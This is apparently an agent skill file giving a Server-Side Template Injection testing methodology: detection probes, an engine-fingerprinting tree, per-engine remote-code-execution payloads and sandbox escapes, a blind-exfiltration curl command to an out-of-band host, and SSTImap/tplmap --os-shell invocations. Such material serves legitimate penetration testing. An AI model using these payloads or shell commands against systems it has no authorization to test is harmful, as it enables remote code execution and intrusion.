---
name: ssti-testing
description: Detect, fingerprint, and exploit Server-Side Template Injection (WSTG-INPV-18, CWE-1336/CWE-94) end to end — polyglot probing, differential engine fingerprinting (Jinja2/Twig/Freemarker/Velocity/Smarty/Mako/ERB/Pug/Nunjucks), per-engine RCE payloads and sandbox escapes, plus tplmap/SSTImap/TInjA automation; use whenever user input is reflected through a server-rendered template (names, email subjects/bodies, profile fields, error pages, CMS/wiki blocks, PDF/report generators).
license: Apache-2.0
metadata:
  author: Section9Labs
  wstg: WSTG-INPV-18
  cwe: CWE-1336
---

# SSTI Testing

Server-Side Template Injection: user input is concatenated into a template that
the server **evaluates** (not just echoes). Any evaluated expression is one
engine-specific chain away from RCE. The methodology is strictly ordered:
**detect → fingerprint the engine → exploit with that engine's chain**.
Exploiting without fingerprinting wastes requests and can crash the renderer.

Candidate injection points: any value that reappears in a rendered page or
generated artifact — `?name=`, profile display names, email subject/body
templates, invoice/PDF fields, error pages that reflect input, CMS/newsletter
template editors, search terms, HTTP headers reflected into pages.

## 1. Detection

Inject the polyglot into every rendered field, one field at a time:

```
${{<%[%'"}}%\
```

Three possible outcomes:

| Response | Meaning | Next step |
|---|---|---|
| Template/stack-trace error (`TemplateSyntaxError`, `Twig\Error`, `freemarker.core.ParseException`, `Velocity`, `SmartyCompilerError`, `(erb):1`, …) | Input reaches a template parser | Fingerprint via the error string — it usually names the engine (see `references/detection-and-fingerprint.md`) |
| Polyglot echoed back literally, unmodified | Probably no SSTI (still try arithmetic — some engines swallow bad syntax silently) | Arithmetic probes |
| Polyglot partially stripped / blank output | Expression consumed — strong signal | Arithmetic probes |

Confirm **evaluation** with arithmetic wrapped in unique markers so you can
grep the response (`s9l{{7*7}}s9r` → look for `s9l49s9r`):

```
{{7*7}}     ${7*7}     #{7*7}     <%= 7*7 %>     {7*7}     [[${7*7}]]
```

A `49` in the response where you injected the expression = confirmed SSTI.
Check **every** reflection location: the immediate response, and stored
contexts (emails sent, admin panels, generated PDFs) for stored SSTI.

## 2. Engine fingerprinting (differential probes)

Never skip this. The same `{{7*7}}=49` can be five different engines with
five different RCE chains. Run the differential tree:

```
{{7*7}} → 49 ?
 ├─ yes → {{7*'7'}} → 7777777  ⇒ Jinja2 (Python; string*int repeats)
 │        {{7*'7'}} → 49       ⇒ Twig (PHP coerces '7' to int)
 │        {{7*'7'}} → error    ⇒ try {{self}} / {{dump(app)}} (Twig/Symfony)
 ├─ no  → ${7*7} → 49 ?
 │        ├─ ${"z"?upper_case} → Z        ⇒ Freemarker
 │        ├─ ${7*'7'} → 7777777           ⇒ Mako (Python)
 │        ├─ #set($x=7*7)${x} → 49        ⇒ Velocity
 │        └─ otherwise                     ⇒ EL/SpEL/Groovy — see reference
 ├─ no  → <%= 7*7 %> → 49                 ⇒ ERB (Ruby)
 ├─ no  → #{7*7} → 49                      ⇒ Pug/Slim/Ruby interpolation
 ├─ no  → {7*7} → 49                       ⇒ Smarty
 └─ no  → [[${7*7}]] / *{7*7} → 49         ⇒ Thymeleaf
```

Nunjucks vs Jinja2 (identical `{{7*7}}`): `{{range.constructor}}` returns
`function Function()...` on Nunjucks (JS); Jinja2 errors. Full tree, error
signatures, and ambiguity-breakers: `references/detection-and-fingerprint.md`.

Use the helper to generate/send the whole ordered probe set and auto-classify:

```
python3 scripts/ssti_probe.py --url "https://example.com/greet" --param name --send \
  --work-units ssti-units.json
```

Without `--send` it prints the probe plan (payload → expected marker → engine)
for manual injection through Burp Repeater or mitmproxy.

## 3. Exploitation → RCE (per engine)

Full payload sets and sandbox escapes in `references/exploitation.md`.
Minimum viable chains (replace `id` with your command):

- **Jinja2**: recon `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`;
  RCE `{{cycler.__init__.__globals__.os.popen('id').read()}}`; blocked-builtins
  escape `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}`.
- **Twig** (<2.x): `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`;
  modern Twig/Craft: `{{['id']|filter('system')}}` or `{{['id']|map('system')}}`.
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- **Velocity**: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")`
  or the ClassTool/reflection chain in the reference.
- **Smarty**: `{system('id')}`; legacy `{php}system('id');{/php}`.
- **Mako**: `${__import__('os').popen('id').read()}`.
- **ERB**: `<%= `id` %>` or `<%= system('id') %>`.
- **Pug**: `#{root.process.mainModule.require('child_process').execSync('id')}`.
- **Nunjucks**: `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`.

If output is not reflected (blind SSTI), use an OOB sleeve: swap the command
for `nslookup <id>.oast.pro` / `curl http://<id>.oast.pro/$(whoami)` with an
`interactsh-client` session running (`interactsh-client -json -o oast.json`);
a DNS/HTTP hit proves execution. Time-based fallback: `sleep 5` and compare
response times.

## 4. Tool automation

Details and full flag tables in `references/tools.md`.

- **SSTImap** (maintained, Python 3 — preferred):
  `python3 sstimap.py -u 'https://example.com/greet?name=John' --os-shell`
  (also `--os-cmd 'id'`, `-d` for POST data, `-e <engine>` to force).
- **TInjA** (Go, ~44 engines, best fingerprinting):
  `tinja url -u 'https://example.com/greet?name=John'` or
  `tinja raw -r request.txt` for a captured raw request.
- **tplmap** (original, Python 2, unmaintained — only when the forks fail):
  `./tplmap.py -u 'https://example.com/greet?name=John' --os-shell`.

Workflow: TInjA to detect+fingerprint at scale → SSTImap `--os-shell` on
confirmed hits → manual payloads from `references/exploitation.md` when the
tools' chains are filtered.

## 5. rupu wiring (required at every parse/handoff step)

Exact JSON shapes in `references/rupu.md`.

1. **After detection sweep**: `ssti_probe.py --work-units ssti-units.json`
   writes a JSON array (first char `[`) of candidate injection points — hand
   the normalized array to the `work-units` skill for `for_each:`/`dispatch`
   fan-out, one unit per (url, param, suspected engine).
2. **Mark coverage** with `assets.mark` per the `coverage-assets` skill:
   each probed route is kind `web:route` with the `param` coordinate —
   `depth=tested` once probed, `depth=exploited` once an expression evaluated
   or RCE landed.
3. **Report every confirmed evaluation** via the `finding-report` skill /
   `findings.report`: scope `endpoint`, `target_ref` = affected URL, severity
   `high` (evaluation/data exposure) or `critical` (RCE), classification
   `WSTG-INPV-18` + `CWE-1336` (`CWE-94` for direct code eval), evidence =
   the probe HTTP request and the evaluated response (the `49` / command
   output / OAST hit). `ssti_probe.py --finding finding.json` emits the
   ready-to-submit payload.

## References

- `references/detection-and-fingerprint.md` — polyglot behavior, full decision tree, error-message → engine table.
- `references/exploitation.md` — per-engine RCE payloads, sandbox escapes, blind/OOB technique.
- `references/tools.md` — tplmap / SSTImap / TInjA flags and workflows.
- `references/rupu.md` — work-unit, assets.mark, findings.report shapes.
